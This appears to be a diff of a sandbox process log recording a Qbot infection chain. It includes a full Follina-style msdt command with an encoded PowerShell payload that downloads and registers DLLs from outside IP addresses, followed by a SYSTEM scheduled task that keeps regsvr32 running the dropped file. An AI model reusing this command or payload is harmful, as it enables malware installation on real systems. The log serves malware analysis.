@@ -41,15 +41,45 @@ regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\qbot\019338921.dll
 
 "C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Users\Admin\AppData\Local\Temp\doc532.docx"
 
-C:\Windows\splwow64.exe 12288
+iexplore.exe" http://185.234.247.119:80/123.RES
 
-iexplore.exe" -Embedding
+IEXPLORE.EXE" SCODEF:2356 CREDAT:82945 /prefetch:2
 
-IEXPLORE.EXE" SCODEF:1924 CREDAT:275457 /prefetch:2
+msdt.exe" ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JABwACAAPQAgACQARQBuAHYAOgB0AGUAbQBwADsAaQB3AHIAIABoAHQAdABwADoALwAvADEAMAA0AC4AMwA2AC4AMgAyADkALgAxADMAOQAvACQAKAByAGEAbgBkAG8AbQApAC4AZABhAHQAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAXAB0AC4AQQA7AGkAdwByACAAaAB0AHQAcAA6AC8ALwA4ADUALgAyADMAOQAuADUANQAuADIAMgA4AC8AJAAoAHIAYQBuAGQAbwBtACkALgBkAGEAdAAgAC0ATwB1AHQARgBpAGwAZQAgACQAcABcAHQAMQAuAEEAOwBpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMANAAuADIANAA3AC4AMQAxADkALwAkACgAcgBhAG4AZABvAG0AKQAuAGQAYQB0ACAALQBPAHUAdABGAGkAbABlACAAJABwAFwAdAAyAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQALgBBADsAcgBlAGcAcwB2AHIAMwAyACAAJABwAFwAdAAxAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQAMgAuAEEA'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
 
-IEXPLORE.EXE" SCODEF:1924 CREDAT:472068 /prefetch:2
+rundll32.exe" C:\Windows\system32\pcwutl.dll,LaunchApplication "i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
 
-hxxp://185.234.247.119/123.RES
+sdiagnhost.exe -Embedding
+
+csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\noyvixjx\noyvixjx.cmdline"
+
+cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RESD7E6.tmp" "c:\Users\Admin\AppData\Local\Temp\noyvixjx\CSC816EBD9A50114C31956361FC43DD1F15.TMP"
+
+csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\czny1u1g\czny1u1g.cmdline"
+
+cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RESD8E0.tmp" "c:\Users\Admin\AppData\Local\Temp\czny1u1g\CSCBEB976C760E4DD2B49DACCE9711989.TMP"
+
+regsvr32.exe C:\Users\Admin\AppData\Local\Temp\t.A
+
+regsvr32.exe C:\Users\Admin\AppData\Local\Temp\t.A
+
+explorer.exe
+
+regsvr32.exe" C:\Users\Admin\AppData\Local\Temp\t1.A
+
+explorer.exe
+
+schtasks.exe /Create /RU "NT AUTHORITY\SYSTEM" /tn ojvcvuo /tr "regsvr32.exe -s \"C:\Users\Admin\AppData\Local\Temp\t1.A\"" /SC ONCE /Z /ST 17:16 /ET 17:28
+
+regsvr32.exe C:\Users\Admin\AppData\Local\Temp\t2.A
+
+regsvr32.exe C:\Users\Admin\AppData\Local\Temp\t2.A
+
+C:\Windows\SysWOW64\explorer.exe
+
+csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\nqbusbhc\nqbusbhc.cmdline"
+
+cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RESF91A.tmp" "c:\Users\Admin\AppData\Local\Temp\nqbusbhc\CSC461260CDFC8D4054BB1ED1C4DBD0115F.TMP"
 
 *************************************************
 
